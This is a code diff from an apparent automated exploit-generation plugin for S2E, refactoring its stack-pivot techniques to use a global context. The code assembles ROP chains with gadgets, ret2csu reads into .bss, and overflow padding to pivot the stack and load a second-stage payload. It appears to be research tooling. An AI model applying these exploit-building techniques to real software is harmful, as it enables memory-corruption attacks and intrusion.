@@ -33,8 +33,8 @@ namespace s2e::plugins::crax {
 
 using RopSubchain = Technique::RopSubchain;
 
-BasicStackPivot::BasicStackPivot(CRAX &ctx)
-    : StackPivot(ctx) {
+BasicStackPivot::BasicStackPivot()
+    : StackPivot() {
     resolveRequiredGadgets();
 }
 
@@ -46,12 +46,18 @@ bool BasicStackPivot::checkRequirements() const {
 
 void BasicStackPivot::resolveRequiredGadgets() {
     // Gadgets
-    m_ctx.getExploit().registerSymbol("ret", m_ctx.getExploit().resolveGadget("ret"));
-    m_ctx.getExploit().registerSymbol("pop_rbp_ret", m_ctx.getExploit().resolveGadget("pop rbp ; ret"));
-    m_ctx.getExploit().registerSymbol("leave_ret", m_ctx.getExploit().resolveGadget("leave ; ret"));
+    g_crax->getExploit().registerSymbol("ret",
+            g_crax->getExploit().resolveGadget("ret"));
+
+    g_crax->getExploit().registerSymbol("pop_rbp_ret",
+            g_crax->getExploit().resolveGadget("pop rbp ; ret"));
+
+    g_crax->getExploit().registerSymbol("leave_ret",
+            g_crax->getExploit().resolveGadget("leave ; ret"));
 
     // Memory locations
-    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
+    g_crax->getExploit().registerSymbol("pivot_dest",
+            g_crax->getExploit().getElf().bss() + 0x800);
 }
 
 
@@ -66,16 +72,16 @@ std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
     // Write the 2nd stage ROP payload via read() to `pivot_dest`
     // via ret2csu(read, 0, pivot_dest, 1024).
     RopSubchain part2 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
         ConstantExpr::create(1024, Expr::Int64))[0];
 
     // Perform stack pivoting.
     RopSubchain part3 = {
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rbp_ret"),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", "leave_ret")};
+        BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rbp_ret"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "", "leave_ret")};
 
     RopSubchain ret;
     ret.reserve(part1.size() + part2.size() + part3.size());
@@ -91,31 +97,33 @@ RopSubchain BasicStackPivot::getExtraRopSubchain() const {
 
 
 
-AdvancedStackPivot::AdvancedStackPivot(CRAX &ctx)
-    : StackPivot(ctx),
+AdvancedStackPivot::AdvancedStackPivot()
+    : StackPivot(),
       m_offsetToRetAddr(),
       m_readCallSites() {
     resolveRequiredGadgets();
 
-    ctx.beforeInstruction.connect(
+    g_crax->beforeInstruction.connect(
             sigc::mem_fun(*this, &AdvancedStackPivot::maybeInterceptReadCallSites));
 
-    ctx.beforeExploitGeneration.connect(
+    g_crax->beforeExploitGeneration.connect(
             sigc::mem_fun(*this, &AdvancedStackPivot::beforeExploitGeneration));
 }
 
 
 bool AdvancedStackPivot::checkRequirements() const {
-    const auto &sym = m_ctx.getExploit().getElf().symbols();
+    const auto &sym = g_crax->getExploit().getElf().symbols();
     return sym.find("read") != sym.end() && m_readCallSites.size();
 }
 
 void AdvancedStackPivot::resolveRequiredGadgets() {
     // Gadgets
-    m_ctx.getExploit().registerSymbol("pop_rsi_r15_ret", m_ctx.getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));
+    g_crax->getExploit().registerSymbol("pop_rsi_r15_ret",
+            g_crax->getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));
 
     // Memory locations
-    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
+    g_crax->getExploit().registerSymbol("pivot_dest",
+            g_crax->getExploit().getElf().bss() + 0x800);
 }
 
 
@@ -134,18 +142,18 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     // Return to a previous call site of read@libc.
     RopSubchain part1 = {
         ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))};
+        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
+        BaseOffsetExpr::create(g_crax->getExploit(), "", std::to_string(ret2LeaRbp))};
 
     // Generate the payload which guides the weird machine back to the exploitable state.
     RopSubchain part2 = {
         ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
         AddExpr::alloc(
-                BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+                BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
                 AddExpr::alloc(
                         ConstantExpr::create(8, Expr::Int64),
                         ConstantExpr::create(m_offsetToRetAddr, Expr::Int64))),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))
+        BaseOffsetExpr::create(g_crax->getExploit(), "", std::to_string(ret2LeaRbp))
     };
 
     // At this point, a stack-buffer overflow should take place inside libc,
@@ -156,16 +164,16 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     // ret2csu once.
     RopSubchain part3;
     for (size_t i = 0; i < 6; i++) {
-        ref<Expr> e0 = BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rsi_r15_ret");
+        ref<Expr> e0 = BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rsi_r15_ret");
         ref<Expr> e1 = AddExpr::alloc(
-                BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+                BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
                 AddExpr::alloc(
                         ConstantExpr::create(8, Expr::Int64),
                         MulExpr::alloc(
                                 ConstantExpr::create(0x30, Expr::Int64),
                                 ConstantExpr::create(i + 1, Expr::Int64))));
         ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
-        ref<Expr> e3 = BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read");
+        ref<Expr> e3 = BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read");
 
         part3.push_back(e0);
         part3.push_back(e1);
@@ -176,10 +184,10 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
     // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
     // read(0, pivot_dest + 0x30 * 7, 0x400).
     RopSubchain part4 = ret2csu->getRopSubchains(
-            BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+            BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
             ConstantExpr::create(0, Expr::Int64),
             AddExpr::alloc(
-                    BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+                    BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
                     MulExpr::alloc(
                             ConstantExpr::create(0x30, Expr::Int64),
                             ConstantExpr::create(7, Expr::Int64))),
@@ -203,24 +211,24 @@ std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
 
 void AdvancedStackPivot::maybeInterceptReadCallSites(S2EExecutionState *state,
                                                      const Instruction &i) {
-    if (m_ctx.isCallSiteOf(i.address, "read")) {
-        uint64_t buf = m_ctx.reg().readConcrete(Register::X64::RSI);
-        uint64_t len = m_ctx.reg().readConcrete(Register::X64::RDX);
+    if (g_crax->isCallSiteOf(i.address, "read")) {
+        uint64_t buf = reg().readConcrete(Register::X64::RSI);
+        uint64_t len = reg().readConcrete(Register::X64::RDX);
         m_readCallSites.insert({i.address, buf, len});
     }
 }
 
 void AdvancedStackPivot::beforeExploitGeneration() {
     const auto &readCallSiteInfo = *m_readCallSites.rbegin();
-    uint64_t rsp = m_ctx.reg().readConcrete(Register::X64::RSP);
+    uint64_t rsp = reg().readConcrete(Register::X64::RSP);
     m_offsetToRetAddr = rsp - readCallSiteInfo.buf - 16;
 }
 
 uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr) const {
-    std::string symbol = m_ctx.getBelongingSymbol(readCallSiteAddr);
+    std::string symbol = g_crax->getBelongingSymbol(readCallSiteAddr);
     log<WARN>() << hexval(readCallSiteAddr) << " is within " << symbol << "\n";
 
-    std::vector<Instruction> insns = m_ctx.getDisassembler().disasm(symbol);
+    std::vector<Instruction> insns = disas().disasm(symbol);
     uint64_t ret = 0;
 
     for (int i = insns.size() - 2; i >= 0; i--) {
@@ -230,7 +238,7 @@ uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr) const {
         }
     }
     assert(ret && "determineReturnAddr(): no suitable candidates?");
-    return ret - m_ctx.getExploit().getElf().getBase();
+    return ret - g_crax->getExploit().getElf().getBase();
 }
 
 }  // namespace s2e::plugins::crax
